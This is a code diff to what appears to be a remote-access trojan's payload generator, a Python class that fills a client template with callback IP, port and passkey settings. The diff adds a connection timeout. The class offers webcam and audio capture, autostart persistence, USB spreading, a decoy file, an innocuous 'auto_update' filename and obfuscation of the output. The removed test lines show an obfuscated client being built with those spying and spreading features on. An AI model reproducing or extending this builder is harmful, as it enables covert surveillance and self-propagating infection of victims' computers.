@@ -13,6 +13,7 @@ class SourceGenerator:
     fake_file =     False
     ip_address =    '127.0.0.1'
     port =          '4434'
+    timeout =       '10'
     passkey =       '1705a7f91b40320a19db18912b72148e'
     filename =      'auto_update'
     working_dir =   'iDocuments'
@@ -34,6 +35,7 @@ class SourceGenerator:
             '{%vidcapImport%}': 'import vidcap' if self.webcam else "web_camera = 'NoDevice'",
             '{%ip_address%}': self.ip_address,
             '{%port_number%}': self.port,
+            '{%connection_timeout%}': self.timeout,
             '{%md5key%}': self.passkey,
             '{%filename%}': self.filename,
             '{%get_webcam_device%}': client_snippets.get_webcam_device if self.webcam else '',
@@ -68,6 +70,9 @@ class SourceGenerator:
     def set_port(self, port):
         self.port = port
 
+    def set_timeout(self, timeout):
+        self.timeout = timeout
+
     def set_passkey(self, passkey):
         self.passkey = passkey
 
@@ -83,15 +88,3 @@ class SourceGenerator:
 
     def obfuscate(self, __path):
         pyobfuscator.main(__path)
-
-
-# Tests
-a = SourceGenerator()
-a.use_audio(True)
-a.use_autostart(True)
-a.use_usb_spreading(True)
-a.use_fake_file(True)
-a.set_working_dir_name('apple')
-a.set_file_name('update_generator')
-a.generate_source('source2.py')
-a.obfuscate(a.generated_source_file)
